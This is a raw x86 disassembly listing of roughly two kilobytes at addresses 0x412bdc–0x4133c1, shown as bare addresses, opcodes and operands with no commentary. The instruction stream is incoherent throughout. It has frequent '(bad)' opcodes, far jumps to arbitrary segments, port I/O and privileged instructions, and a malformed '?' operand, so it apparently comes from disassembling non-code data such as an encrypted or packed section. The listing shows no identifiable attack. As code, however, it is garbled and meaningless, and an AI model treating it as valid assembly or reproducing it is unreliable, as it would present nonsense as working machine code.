  412bdc:	fisttp WORD PTR [eax-0x79d8beaa]
  412be2:	imul   ecx,DWORD PTR [ecx+0xca65da2],0x2e
  412be9:	pop    ss
  412bea:	sbb    bh,bl
  412bec:	call   0xf1dc:0x42dbaa9b
  412bf3:	dec    ebp
  412bf4:	push   0xbab68ad2
  412bf9:	or     BYTE PTR [esi+0x5d],ch
  412bfc:	adc    eax,0x92c21912
  412c01:	and    al,BYTE PTR [esi-0x35797460]
  412c07:	add    esi,DWORD PTR [ecx+0x3441a7]
  412c0d:	fiadd  DWORD PTR ss:[ecx+0x15b483a0]
  412c14:	cld    
  412c15:	xchg   BYTE PTR [edx],al
  412c17:	cs sub al,0xf1
  412c1a:	pushf  
  412c1b:	xor    esi,edi
  412c1d:	inc    edx
  412c1e:	out    0x1b,eax
  412c20:	pop    ss
  412c21:	fcmovbe st,st(6)
  412c23:	bound  edi,QWORD PTR [ebp-0x2c8eabdb]
  412c29:	inc    edx
  412c2a:	shl    BYTE PTR [ecx],1
  412c2c:	pop    edi
  412c2d:	mov    dh,0x6d
  412c2f:	sbb    esp,ebp
  412c31:	add    BYTE PTR [eax-0x2e2e7e3d],dl
  412c37:	push   edi
  412c38:	sbb    eax,0xb4b14d3
  412c3d:	pop    es
  412c3e:	loop   0x412c0d
  412c40:	or     ebx,ebp
  412c42:	sub    BYTE PTR [ecx-0x65],0xa7
  412c46:	shr    DWORD PTR [ebp-0x7e937df7],0xc8
  412c4d:	push   eax
  412c4e:	mov    al,0x40
  412c50:	inc    esi
  412c51:	sbb    DWORD PTR [eax+0x47],ebp
  412c54:	fstp   TBYTE PTR [edx+edx*2]
  412c57:	retf   
  412c58:	push   edi
  412c59:	adc    eax,0x9ed6ea9b
  412c5e:	pop    es
  412c5f:	jmp    0xc6ed:0xa0873e31
  412c66:	(bad)  
  412c67:	jbe    0x412ca2
  412c69:	cwde   
  412c6a:	sbb    edx,esp
  412c6c:	mov    edi,0x247a785c
  412c71:	push   0x8512e969
  412c76:	repz cmp eax,0xd798b834
  412c7c:	dec    edx
  412c7d:	push   eax
  412c7e:	fstp   st(2)
  412c80:	lods   eax,DWORD PTR ds:[esi]
  412c81:	jl     0x412c29
  412c83:	add    BYTE PTR [eax],bl
  412c85:	test   DWORD PTR [ebx],edi
  412c87:	call   0x7e61dd1d
  412c8c:	sbb    bl,0xb6
  412c8f:	cmp    eax,0x4771892d
  412c94:	pop    es
  412c95:	retf   
  412c96:	mov    edx,esp
  412c98:	mov    ch,0x44
  412c9a:	or     ebp,DWORD PTR ds:0xef8268dc
  412ca0:	imul   ebx,DWORD PTR [ebx+0x6a12a52a],0xffffffae
  412ca7:	pop    ebx
  412ca8:	add    esi,DWORD PTR [ecx+ebp*4-0x56]
  412cac:	push   eax
  412cad:	(bad)  
  412cae:	leave  
  412caf:	cmc    
  412cb0:	mov    ah,0x2
  412cb2:	cmp    ecx,ebx
  412cb4:	mov    eax,0x292e0bb5
  412cb9:	xchg   edx,eax
  412cba:	inc    edi
  412cbb:	mov    dh,0xb0
  412cbd:	adc    DWORD PTR [ebx],eax
  412cbf:	xchg   ecx,eax
  412cc0:	fcomp  st(2)
  412cc2:	push   es
  412cc3:	push   0xaa9a29b4
  412cc8:	stos   BYTE PTR es:[edi],al
  412cc9:	in     al,dx
  412cca:	mov    esi,0x805b5b02
  412ccf:	dec    eax
  412cd0:	ja     0x412c67
  412cd2:	mov    dh,0x3a
  412cd4:	mov    ah,0xa6
  412cd6:	mov    al,ds:0xe3a9d2db
  412cdb:	cmc    
  412cdc:	jmp    0xc2951ab0
  412ce1:	push   es
  412ce2:	mov    bh,0x8d
  412ce4:	ret    0x5d39
  412ce7:	jp     0x412c87
  412ce9:	push   cs
  412cea:	adc    DWORD PTR [ecx+0xa],esp
  412ced:	pop    ss
  412cee:	push   ss
  412cef:	sbb    bl,bl
  412cf1:	mov    esi,0x2e7ba4c2
  412cf6:	mov    al,BYTE PTR [eax+0x24]
  412cf9:	jl     0x412cfb
  412cfb:	jbe    0x412d51
  412cfd:	ins    BYTE PTR es:[edi],dx
  412cfe:	lods   eax,DWORD PTR ds:[esi]
  412cff:	pusha  
  412d00:	inc    ecx
  412d01:	idiv   DWORD PTR ds:0x29adc2c0
  412d07:	push   ds
  412d08:	shr    DWORD PTR [eax+0x5d],0xe5
  412d0c:	xchg   esp,eax
  412d0d:	les    ecx,FWORD PTR [ebp-0x33f8afbe]
  412d13:	or     eax,0xa1bba1f
  412d18:	outs   dx,BYTE PTR ds:[esi]
  412d19:	fist   WORD PTR [eax+0x32c42019]
  412d1f:	stos   DWORD PTR es:[edi],eax
  412d20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d21:	cli    
  412d22:	cld    
  412d23:	mov    ss:0x70401d4b,al
  412d29:	pop    edx
  412d2a:	push   esi
  412d2b:	push   eax
  412d2c:	mov    ecx,0xea8d8553
  412d31:	sahf   
  412d32:	(bad)  
  412d33:	scas   al,BYTE PTR es:[edi]
  412d34:	bound  edi,QWORD PTR [ecx+0x5d]
  412d37:	mov    ebx,0x425aaa35
  412d3c:	in     al,dx
  412d3d:	mov    cl,0x77
  412d3f:	idiv   edx
  412d41:	into   
  412d42:	push   ebp
  412d43:	in     eax,dx
  412d44:	(bad)  
  412d45:	inc    edx
  412d46:	fld    st(0)
  412d48:	hlt    
  412d49:	dec    eax
  412d4a:	ds sbb eax,0x685da376
  412d50:	(bad)  
  412d51:	mov    dl,0xd0
  412d53:	imul   edx,DWORD PTR [ebp-0x1c747f2e],0xf950b6e0
  412d5d:	xchg   ecx,eax
  412d5e:	add    dh,dl
  412d60:	adc    dl,BYTE PTR [edi]
  412d62:	dec    esp
  412d63:	out    dx,eax
  412d64:	enter  0xb521,0x60
  412d68:	mov    ds:0xe8458703,al
  412d6d:	dec    ecx
  412d6e:	sbb    al,0xa1
  412d70:	jl     0x412d55
  412d72:	mov    dh,0xdc
  412d74:	adc    esp,DWORD PTR [esp+esi*1+0x1beac6]
  412d7b:	adc    DWORD PTR [ecx-0xf],esp
  412d7e:	mov    dh,0xad
  412d80:	aam    0x76
  412d82:	push   es
  412d83:	jo     0x412dff
  412d85:	add    eax,0x595462c9
  412d8a:	cmp    BYTE PTR [edx+ebx*8+0x36],bl
  412d8e:	ss or  al,0x97
  412d91:	(bad)  
  412d92:	jecxz  0x412da5
  412d94:	cmp    BYTE PTR [ebp-0x5f],0x46
  412d98:	xchg   edi,eax
  412d99:	outs   dx,BYTE PTR ds:[esi]
  412d9a:	jne    0x412dec
  412d9c:	lahf   
  412d9d:	jp     0x412dac
  412d9f:	xor    eax,0x50f582
  412da4:	adc    edx,DWORD PTR [edi-0x13cb35ea]
  412daa:	sub    al,dh
  412dac:	sub    al,0x5c
  412dae:	mov    esi,gs
  412db0:	push   ds
  412db1:	mov    eax,0x66ead4b1
  412db6:	lahf   
  412db7:	stos   DWORD PTR es:[edi],eax
  412db8:	stos   BYTE PTR es:[edi],al
  412db9:	and    esi,esi
  412dbb:	(bad)  
  412dbc:	icebp  
  412dbd:	les    ebp,FWORD PTR [ebp-0x36169723]
  412dc3:	and    eax,DWORD PTR [ecx+0x13]
  412dc6:	fld    TBYTE PTR [ecx+0x4475b5ee]
  412dcc:	dec    ebx
  412dcd:	and    eax,0x899a5464
  412dd2:	adc    al,0xe5
  412dd4:	mov    bh,0xda
  412dd6:	push   esi
  412dd7:	mov    esp,0xf41c95cb
  412ddc:	mov    eax,ds:0xc67b4600
  412de1:	(bad)  
  412de2:	ins    DWORD PTR es:[edi],dx
  412de3:	sbb    edi,DWORD PTR [edi]
  412de5:	xchg   ecx,eax
  412de6:	fisubr DWORD PTR [ebp-0x47b2d495]
  412dec:	ss push 0xf0db6d2d
  412df2:	xchg   dh,dh
  412df4:	inc    dl
  412df6:	out    0xb7,al
  412df8:	adc    esi,DWORD PTR [edi]
  412dfa:	fcomp  DWORD PTR [eax-0x28]
  412dfd:	test   dl,bl
  412dff:	add    al,0xb
  412e01:	mov    bh,0x6e
  412e03:	mov    WORD PTR [edx-0x729128b4],es
  412e09:	in     eax,0x0
  412e0b:	lahf   
  412e0c:	cmp    BYTE PTR [ebx],bh
  412e0e:	and    al,0x4d
  412e10:	xchg   BYTE PTR [edi],dh
  412e12:	add    eax,0xc557400e
  412e17:	and    eax,0x39061035
  412e1c:	push   ecx
  412e1d:	fist   DWORD PTR [ecx+0x2c]
  412e20:	mov    edi,0x5ad96f
  412e25:	push   edx
  412e26:	cdq    
  412e27:	sbb    DWORD PTR [ebx-0x2c],ebp
  412e2a:	inc    edx
  412e2b:	sbb    dh,BYTE PTR [ebx+ebx*2-0x5d77ae45]
  412e32:	sbb    bl,BYTE PTR ds:0xbf8fc62c
  412e38:	push   0xffffffbb
  412e3a:	sub    eax,0xcabcb82c
  412e3f:	ins    BYTE PTR es:[edi],dx
  412e40:	(bad)
  412e43:	add    eax,0xadd05788
  412e48:	mov    edi,esi
  412e4a:	in     al,0xcb
  412e4c:	jecxz  0x412e41
  412e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e4f:	shl    BYTE PTR [esi-0x7f3daad3],1
  412e55:	int    0x6b
  412e57:	adc    edx,DWORD PTR [edx+0x42d10683]
  412e5d:	push   ebx
  412e5e:	out    0x84,al
  412e60:	shl    DWORD PTR [ebp-0x22494935],cl
  412e66:	mov    dh,0x38
  412e68:	inc    esi
  412e69:	jno    0x412e2e
  412e6b:	ins    BYTE PTR es:[edi],dx
  412e6c:	cmp    eax,DWORD PTR [esi+0x5cff26e0]
  412e72:	fcmovu st,st(2)
  412e74:	or     eax,0x2917fb74
  412e79:	push   cs
  412e7a:	mov    al,ds:0x7625619e
  412e7f:	inc    eax
  412e80:	ins    BYTE PTR es:[edi],dx
  412e81:	ins    BYTE PTR es:[edi],dx
  412e82:	iret   
  412e83:	vmread DWORD PTR ds:0x1ad4699b,ebp
  412e8a:	aaa    
  412e8b:	call   0x9357:0x60648c82
  412e92:	mov    ebp,0xdd04d5b4
  412e97:	jge    0x412f08
  412e99:	push   ss
  412e9a:	mov    ds:0xdc1a2586,al
  412e9f:	call   0xeaa9e926
  412ea4:	cmp    ecx,DWORD PTR [edi-0x56]
  412ea7:	cdq    
  412ea8:	(bad)  [esi+0x5d]
  412eab:	push   0x2c96a5c
  412eb0:	push   ss
  412eb1:	rcl    ebp,1
  412eb3:	cs stc 
  412eb5:	jmp    0x8e1c:0x685b6da5
  412ebc:	scas   al,BYTE PTR es:[edi]
  412ebd:	mov    al,0x4
  412ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ec0:	pop    ebp
  412ec1:	dec    edx
  412ec2:	jne    0x412f19
  412ec4:	fdiv   QWORD PTR [esi+0x35802f08]
  412eca:	mov    edi,0x82a93653
  412ecf:	pop    ebx
  412ed0:	mov    ebx,0x893fb86d
  412ed5:	repnz sbb eax,0x66a3544
  412edb:	pusha  
  412edc:	and    edx,ebx
  412ede:	lds    esi,FWORD PTR cs:[ebp+0x6994ae9]
  412ee5:	pop    ss
  412ee6:	fiadd  DWORD PTR [ebp-0x53cab552]
  412eec:	sbb    BYTE PTR [edx],ah
  412eee:	add    ch,BYTE PTR [ebx]
  412ef0:	or     eax,0x742c2c1b
  412ef5:	add    BYTE PTR [ecx+0x25fd67d2],cl
  412efb:	jl     0x412ed8
  412efd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412efe:	add    ch,BYTE PTR [esi]
  412f00:	xor    esi,ebx
  412f02:	xchg   ebx,eax
  412f03:	sbb    al,0x65
  412f05:	mov    ebp,0x16d07a1
  412f0a:	push   0xf5bb010b
  412f0f:	pop    ebp
  412f10:	inc    eax
  412f11:	adc    DWORD PTR [edx-0x24e4ea4c],ebp
  412f17:	fcos   
  412f19:	fstp   DWORD PTR [ebx+0x96d6db8]
  412f1f:	into   
  412f20:	scas   eax,DWORD PTR es:[edi]
  412f21:	jecxz  0x412f34
  412f23:	mov    eax,ds:0x6c79ae86
  412f28:	sub    al,0x6c
  412f2a:	push   eax
  412f2b:	rcr    DWORD PTR [ebp+ebx*8-0x1b],0xb3
  412f30:	adc    eax,0x41b001c0
  412f35:	sub    eax,0xe2d42664
  412f3a:	mov    ebx,0x681d0bb5
  412f3f:	adc    eax,0xe929d146
  412f44:	cmp    BYTE PTR ds:0x89b668ca,dl
  412f4a:	loop   0x412f8e
  412f4c:	mov    ch,0x17
  412f4e:	std    
  412f4f:	jmp    0x5c36c628
  412f54:	pop    ebx
  412f55:	mov    cl,BYTE PTR [ebp+0x3c5bebff]
  412f5b:	das    
  412f5c:	ds mov edx,0x881a96b6
  412f62:	mov    edi,0xe4d1cce5
  412f67:	mov    dl,0x19
  412f69:	or     BYTE PTR [eax-0x254dd74b],bh
  412f6f:	mov    dl,0xeb
  412f71:	mov    dl,BYTE PTR [esi]
  412f73:	fisubr DWORD PTR [esi]
  412f75:	adc    edx,DWORD PTR [ecx-0x5c]
  412f78:	and    edx,DWORD PTR [ebp-0xd]
  412f7b:	jbe    0x412f26
  412f7d:	adc    ch,dl
  412f7f:	dec    edi
  412f80:	test   al,0xd1
  412f82:	test   BYTE PTR [edx-0x1a],0x1b
  412f86:	pop    ebx
  412f87:	push   edi
  412f88:	aam    0xe9
  412f8a:	mov    edx,0x78384742
  412f8f:	pop    ecx
  412f90:	lea    eax,[ebp-0x47bb7a0e]
  412f96:	xor    eax,0xa65f5200
  412f9b:	enter  0xda27,0x16
  412f9f:	fcmovb st,st(2)
  412fa1:	aad    0xe0
  412fa3:	cs mov ah,al
  412fa6:	popa   
  412fa7:	dec    edi
  412fa8:	cmc    
  412fa9:	mov    al,ch
  412fab:	mov    ds:0xf9bb00da,al
  412fb0:	inc    esp
  412fb1:	or     BYTE PTR [eax+eax*2],dh
  412fb4:	pop    ss
  412fb5:	fmul   DWORD PTR [ebp+0x6e1eab68]
  412fbb:	sub    al,0xc1
  412fbd:	mov    dh,0xd1
  412fbf:	outs   dx,BYTE PTR ds:[esi]
  412fc0:	sub    al,0x10
  412fc2:	xlat   BYTE PTR ds:[ebx]
  412fc3:	and    DWORD PTR [edx+0x18],edi
  412fc6:	xchg   ebp,eax
  412fc7:	dec    eax
  412fc8:	aaa    
  412fc9:	dec    edx
  412fca:	(bad)  [esi-0xa872493]
  412fd0:	stc    
  412fd1:	jge    0x41301f
  412fd3:	out    0xac,al
  412fd5:	and    eax,DWORD PTR [edi-0x1d]
  412fd8:	jno    0x412f87
  412fda:	mov    ah,0x41
  412fdc:	mov    ah,0x14
  412fde:	ja     0x413052
  412fe0:	pop    eax
  412fe1:	es adc al,0x4d
  412fe4:	inc    ecx
  412fe5:	or     ebx,ebx
  412fe7:	into   
  412fe8:	xchg   dh,bh
  412fea:	xor    cl,BYTE PTR [ecx-0x58]
  412fed:	xor    bh,BYTE PTR [ecx+0x52c1b041]
  412ff3:	and    al,0x49
  412ff5:	xchg   ebp,eax
  412ff6:	pop    ebx
  412ff7:	popa   
  412ff8:	push   ebx
  412ff9:	shl    DWORD PTR [esi-0x398b3cd5],0x7d
  413000:	pop    edi
  413001:	dec    eax
  413002:	retf   0xd1bf
  413005:	mov    dh,0x5b
  413007:	rol    edx,1
  413009:	xor    ebp,DWORD PTR [ebx+0x75]
  41300c:	push   esi
  41300d:	shl    dh,cl
  41300f:	push   ds
  413010:	add    BYTE PTR [edi+0x15],ah
  413013:	in     eax,0xb7
  413015:	lods   eax,DWORD PTR ds:[esi]
  413016:	sub    eax,0x67fb86b2
  41301b:	sahf   
  41301c:	stc    
  41301d:	ins    DWORD PTR es:[edi],dx
  41301e:	add    dl,cl
  413020:	icebp  
  413021:	adc    eax,ecx
  413023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413024:	mov    bh,BYTE PTR [eax]
  413026:	mov    DWORD PTR [esi],0xdadd8771
  41302c:	inc    edx
  41302d:	push   ebp
  41302e:	fisub  DWORD PTR ds:0x402f20e1
  413034:	add    bl,bl
  413036:	push   ebp
  413037:	je     0x412fdc
  413039:	mov    DWORD PTR [edi],esp
  41303b:	mov    eax,0x56bd8ff9
  413040:	bound  esi,QWORD PTR [edx+0x1042dbb5]
  413046:	sub    ebx,DWORD PTR [ebx+0x3e178be1]
  41304c:	mov    eax,0xed6d6db5
  413051:	sbb    ah,bl
  413053:	cmc    
  413054:	clc    
  413055:	(bad)  
  413056:	xchg   ecx,eax
  413057:	ret    
  413058:	into   
  413059:	popa   
  41305a:	shr    BYTE PTR [ebp-0x57],cl
  41305d:	adc    eax,0x71891496
  413062:	mov    ch,BYTE PTR [edi+0x7a]
  413065:	stos   BYTE PTR es:[edi],al
  413066:	pop    edx
  413067:	mov    bh,0x8d
  413069:	(bad)  
  41306a:	jo     0x413016
  41306c:	sbb    eax,0xc556015e
  413071:	mov    dh,0x95
  413073:	pop    esp
  413074:	inc    ecx
  413075:	lods   al,BYTE PTR ds:[esi]
  413076:	jno    0x4130c7
  413078:	mov    ds:0xa83e2dda,al
  41307d:	sbb    eax,0x1d936fd9
  413082:	mov    esp,0xa2b40428
  413087:	stos   DWORD PTR es:[edi],eax
  413088:	ss sub eax,0x2ad858dc
  41308e:	setno  ch
  413091:	jmp    0x6d11:0xe2943932
  413098:	hlt    
  413099:	mov    ch,0x2c
  41309b:	mov    edx,esp
  41309d:	mov    ch,0x79
  41309f:	or     al,0x61
  4130a1:	mov    DWORD PTR [edx+0x6a],ebx
  4130a4:	rol    BYTE PTR [esi-0x882418d],0xa0
  4130ab:	mov    al,0x1
  4130ad:	push   0x745d7aa3
  4130b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130b3:	mov    ds:0x5cd8d85d,eax
  4130b8:	data16 sub ch,al
  4130bb:	popf   
  4130bc:	mov    ds:0x16753281,al
  4130c1:	push   ss
  4130c2:	mov    dh,0x76
  4130c4:	push   esp
  4130c5:	in     eax,0x8f
  4130c7:	mov    dh,0x9e
  4130c9:	xchg   ecx,eax
  4130ca:	int    0x88
  4130cc:	sti    
  4130cd:	shl    BYTE PTR [esi+0x4],1
  4130d0:	fdiv   QWORD PTR ds:0xc9aa8a29
  4130d6:	inc    esp
  4130d7:	adc    DWORD PTR [esi],edx
  4130d9:	sbb    dl,cl
  4130db:	mov    eax,0xc6df2cdc
  4130e0:	out    0x52,al
  4130e2:	mov    edi,0x8256c6d6
  4130e7:	dec    esi
  4130e8:	and    esi,DWORD PTR [edi]
  4130ea:	sbb    esp,DWORD PTR [ebx]
  4130ec:	sub    BYTE PTR [eax-0x2c1df9bf],bh
  4130f2:	pop    ebp
  4130f3:	mov    ebx,0x800d40be
  4130f8:	lods   eax,DWORD PTR ds:[esi]
  4130f9:	ins    DWORD PTR es:[edi],dx
  4130fa:	sub    bl,dl
  4130fc:	dec    ebp
  4130fd:	js     0x413101
  4130ff:	push   cs
  413100:	mov    eax,0x851b1b4c
  413105:	lock xchg esi,eax
  413107:	out    0xb4,eax
  413109:	imul   esp,DWORD PTR [edi+0x175576d8],0x43
  413110:	test   al,0xdd
  413112:	cwde   
  413113:	addr16 push ecx
  413115:	or     bh,cl
  413117:	jne    0x4130f4
  413119:	sbb    bl,BYTE PTR [edi-0xc2a113c]
  41311f:	imul   edx,ebp,0xffffffdd
  413122:	cmp    esp,DWORD PTR [eax+ebp*2-0x7e]
  413126:	ins    DWORD PTR es:[edi],dx
  413127:	pop    es
  413128:	gs mov esp,0xb91dda5c
  41312e:	push   edx
  41312f:	xchg   esi,eax
  413130:	das    
  413131:	pop    ebp
  413132:	pop    eax
  413133:	mov    ch,0x50
  413135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413136:	jge    0x41313a
  413138:	xchg   ebp,eax
  413139:	and    DWORD PTR [eax],eax
  41313b:	inc    DWORD PTR [ecx-0x2f4524b5]
  413141:	push   ss
  413142:	mov    ds:0x55400e71,eax
  413147:	mov    al,0x85
  413149:	popf   
  41314a:	das    
  41314b:	fmul   QWORD PTR [edx]
  41314d:	inc    ebp
  41314e:	pop    ebx
  41314f:	and    ecx,ebx
  413151:	mov    al,0x35
  413153:	or     al,0xd3
  413155:	dec    edx
  413156:	push   ebp
  413157:	sub    BYTE PTR [edx],ch
  413159:	jo     0x41313b
  41315b:	fild   DWORD PTR es:[ebp-0x546a224a]
  413162:	outs   dx,BYTE PTR ds:[esi]
  413163:	lds    esp,FWORD PTR [ebx-0x71]
  413166:	mov    eax,0x846ea1ba
  41316b:	(bad)  [esi+0x292f6b6d]
  413171:	mov    ?,ebx
  413173:	stos   BYTE PTR es:[edi],al
  413174:	push   eax
  413175:	hlt    
  413176:	xor    eax,0xd10dadf3
  41317b:	test   DWORD PTR [esi+0x60],esi
  41317e:	xchg   edx,eax
  41317f:	xchg   edx,eax
  413180:	push   edx
  413181:	daa    
  413182:	and    esi,DWORD PTR [edi]
  413184:	xchg   edi,eax
  413185:	outs   dx,BYTE PTR ds:[esi]
  413186:	push   esp
  413187:	mov    edx,0xe38cbf6d
  41318c:	jmp    0x413205
  41318e:	stos   BYTE PTR es:[edi],al
  41318f:	xchg   esp,eax
  413190:	pop    ebp
  413191:	jge    0x4131e5
  413193:	or     ebp,ebp
  413195:	push   esi
  413196:	dec    edx
  413197:	inc    esp
  413198:	ret    0x91a7
  41319b:	std    
  41319c:	xchg   esi,eax
  41319d:	mov    eax,ds:0x7db012d
  4131a2:	add    ebx,0x7
  4131a5:	fwait
  4131a6:	jge    0x413151
  4131a8:	fld    TBYTE PTR [esi+0x6e]
  4131ab:	imul   esi,DWORD PTR [ecx+0x2e],0x36
  4131af:	repnz (bad) [edi-0x76f3d35d]
  4131b6:	mov    ds:0x6f6d6c01,eax
  4131bb:	and    BYTE PTR [esi-0x71],ch
  4131be:	loopne 0x4131a4
  4131c0:	push   ebp
  4131c1:	sub    dh,BYTE PTR [esi+0x35ebdd76]
  4131c7:	outs   dx,BYTE PTR ds:[esi]
  4131c8:	aam    0x61
  4131ca:	cmp    ch,BYTE PTR [edx-0x45]
  4131cd:	mov    cl,0x28
  4131cf:	fxch   st(1)
  4131d1:	pop    edi
  4131d2:	push   0xaf0a880
  4131d7:	mov    dh,0xd1
  4131d9:	inc    ecx
  4131da:	fsub   st(4),st
  4131dc:	sub    eax,0x57494246
  4131e1:	inc    edx
  4131e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131e3:	mov    dh,0x41
  4131e5:	sbb    edx,ebp
  4131e7:	dec    esp
  4131e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131e9:	jmp    0x413174
  4131eb:	mov    ah,0xf5
  4131ed:	push   es
  4131ee:	jmp    0xcd65:0xd9acd6c2
  4131f5:	sub    BYTE PTR [edi+0x6b70046f],cl
  4131fb:	fld    TBYTE PTR [ebx-0x61]
  4131fe:	cmp    ebx,DWORD PTR [edi]
  413200:	in     al,dx
  413201:	sub    al,0x98
  413203:	inc    ecx
  413204:	add    bl,BYTE PTR [ebx+0x54]
  413207:	pop    ebp
  413208:	push   ebx
  413209:	enter  0x3b38,0x39
  41320d:	push   esi
  41320e:	xor    DWORD PTR [esi-0x41d78736],0xa5b604ce
  413218:	jbe    0x413213
  41321a:	add    esi,DWORD PTR [edx+0x0]
  41321d:	jmp    0x413211
  41321f:	sub    ecx,DWORD PTR [esi]
  413221:	(bad)  
  413222:	retf   0x97bc
  413225:	mov    dh,0x75
  413227:	ror    DWORD PTR ds:0x9e45905f,1
  41322d:	data16 sbb bl,BYTE PTR [ebx+0x155a02ef]
  413234:	fisttp DWORD PTR [ebx]
  413236:	or     edx,DWORD PTR [ebp-0x55e4a43a]
  41323c:	push   ss
  41323d:	adc    dl,BYTE PTR [ebx]
  41323f:	(bad)  
  413240:	fld    DWORD PTR [di]
  413244:	push   0xffffffdb
  413246:	xchg   esi,eax
  413247:	dec    edx
  413248:	add    cl,BYTE PTR [ebx]
  41324a:	push   edx
  41324b:	retf   
  41324c:	pop    ds
  41324d:	push   cs
  41324e:	popa   
  41324f:	xchg   esi,eax
  413250:	cmp    al,BYTE PTR [edx-0x5c51ad73]
  413256:	out    dx,eax
  413257:	mov    esp,0xe5546863
  41325c:	aaa    
  41325d:	mov    bh,cl
  41325f:	mov    dh,0x0
  413261:	and    eax,esp
  413263:	shl    BYTE PTR [ebp+0x57db6dc2],1
  413269:	out    0x3e,eax
  41326b:	jo     0x413290
  41326d:	(bad)  
  41326e:	xor    edi,esi
  413270:	stos   BYTE PTR es:[edi],al
  413271:	ins    BYTE PTR es:[edi],dx
  413272:	pop    ss
  413273:	mov    dh,0x85
  413275:	xchg   esp,eax
  413276:	(bad)  
  413277:	test   al,0x1d
  413279:	mov    bl,0x67
  41327b:	iret   
  41327c:	loope  0x413286
  41327e:	mov    edi,0x5742d6c0
  413283:	int3   
  413284:	out    0x8b,al
  413286:	and    edi,ebx
  413288:	mov    DWORD PTR [ebx+edx*2-0x4c],edx
  41328c:	sub    eax,0xb18f246a
  413291:	sar    DWORD PTR [edx-0x1b],1
  413294:	fwait
  413295:	popa   
  413296:	imul   edx,ebp,0xffffffcb
  413299:	cmc    
  41329a:	jg     0x41326a
  41329c:	pop    esi
  41329d:	push   0xed1b0300
  4132a2:	xchg   esi,eax
  4132a3:	stos   DWORD PTR es:[edi],eax
  4132a4:	fisubr WORD PTR [ecx]
  4132a6:	xchg   edi,eax
  4132a7:	sbb    BYTE PTR [ebx],dh
  4132a9:	jp     0x41327d
  4132ab:	mov    edx,0x8da23adb
  4132b0:	ss test al,0xe8
  4132b3:	fiadd  WORD PTR [eax-0x26]
  4132b6:	inc    ebp
  4132b7:	mov    esp,0x61697685
  4132bc:	or     ecx,DWORD PTR [edi-0x13]
  4132bf:	adc    al,0x3f
  4132c1:	fnstenv [ecx-0xc]
  4132c4:	ins    DWORD PTR es:[edi],dx
  4132c5:	sub    eax,0xdd13a0b5
  4132ca:	sti    
  4132cb:	adc    eax,0x6c688719
  4132d0:	shl    DWORD PTR [esi-0x43cde608],0x8e
  4132d7:	adc    BYTE PTR [ecx],bh
  4132d9:	shr    BYTE PTR [ebp-0x5bff2253],0x5d
  4132e0:	es adc al,0x25
  4132e3:	les    eax,FWORD PTR [edi+0x2a]
  4132e6:	pop    eax
  4132e7:	(bad)  
  4132e9:	push   esp
  4132ea:	cs jne 0x41329d
  4132ed:	and    eax,0xa43800e2
  4132f2:	mov    eax,0xf15808d0
  4132f7:	xchg   edx,eax
  4132f8:	out    0x67,al
  4132fa:	pusha  
  4132fb:	pusha  
  4132fc:	mov    ss:0xe2dca6b6,al
  413302:	lods   eax,DWORD PTR ds:[esi]
  413303:	loop   0x413307
  413305:	add    eax,DWORD PTR [ecx+0x2da7a585]
  41330b:	jnp    0x4132f9
  41330d:	scas   al,BYTE PTR es:[edi]
  41330e:	jl     0x41333f
  413310:	imul   BYTE PTR [esi+0x5b]
  413313:	fistp  DWORD PTR [edx+0x7b]
  413316:	cmp    ah,bl
  413318:	dec    edx
  413319:	retf   
  41331a:	popf   
  41331b:	ja     0x41333b
  41331d:	mov    ebp,DWORD PTR [ecx+0x1ad5b444]
  413323:	test   eax,0x85ef5b0a
  413328:	ins    DWORD PTR es:[edi],dx
  413329:	popa   
  41332a:	popa   
  41332b:	sti    
  41332c:	test   eax,0x898c0d86
  413331:	dec    esp
  413332:	jmp    0x41337f
  413334:	pop    ebx
  413335:	add    edx,ecx
  413337:	dec    esi
  413338:	sub    bl,BYTE PTR [ebp+0x19]
  41333b:	das    
  41333c:	inc    edx
  41333d:	push   eax
  41333e:	pop    edi
  41333f:	aam    0xc0
  413341:	rol    BYTE PTR [edx],cl
  413343:	leave  
  413344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413345:	add    bh,ah
  413347:	and    DWORD PTR [edx-0x4f525a7d],edi
  41334d:	aam    0x7c
  41334f:	adc    dl,al
  413351:	mov    ebp,0xb71af8fe
  413356:	lea    esi,[esi+0x6b]
  413359:	shl    bh,1
  41335b:	cs pop ebx
  41335d:	in     al,dx
  41335e:	adc    eax,0x96016873
  413363:	xchg   ebp,eax
  413364:	outs   dx,BYTE PTR ds:[esi]
  413365:	dec    ebp
  413366:	add    eax,0x8847349e
  41336b:	xchg   DWORD PTR [edx],ebx
  41336d:	push   esi
  41336e:	pusha  
  41336f:	fld    TBYTE PTR [esi]
  413371:	into   
  413372:	lahf   
  413373:	outs   dx,DWORD PTR ds:[esi]
  413374:	inc    ecx
  413375:	adc    al,0x3e
  413377:	sahf   
  413378:	lock xor eax,0xe223ada5
  41337e:	addr16 jp 0x41330c
  413381:	cmc    
  413382:	sub    al,0xc2
  413384:	pop    edi
  413385:	lods   eax,DWORD PTR ds:[esi]
  413386:	jno    0x413363
  413388:	xchg   esi,eax
  413389:	fcmovu st,st(1)
  41338b:	push   ebx
  41338c:	xlat   BYTE PTR ds:[ebx]
  41338d:	imul   edi,DWORD PTR [edi-0x225b7bb2],0xffffff96
  413394:	mov    dh,0x85
  413396:	xchg   ebx,eax
  413397:	push   ss
  413398:	mov    ah,0x2f
  41339a:	in     eax,0x89
  41339c:	pop    esp
  41339d:	push   eax
  41339e:	jb     0x41336a
  4133a0:	lods   eax,DWORD PTR ds:[esi]
  4133a1:	mov    DWORD PTR [ebp+0x415e5fb6],ebp
  4133a7:	sub    BYTE PTR [eax+0x10],bl
  4133aa:	push   ecx
  4133ab:	and    esp,DWORD PTR [ecx]
  4133ad:	fsubr  DWORD PTR [esi-0x4b]
  4133b0:	repnz gs or eax,0x29aaae68
  4133b7:	fidiv  DWORD PTR [ebp-0x154a4e50]
  4133bd:	pop    edx
  4133be:	aaa    
  4133bf:	test   DWORD PTR [eax],ebx
  4133c1:	call   FWORD PTR [eax-0x40]
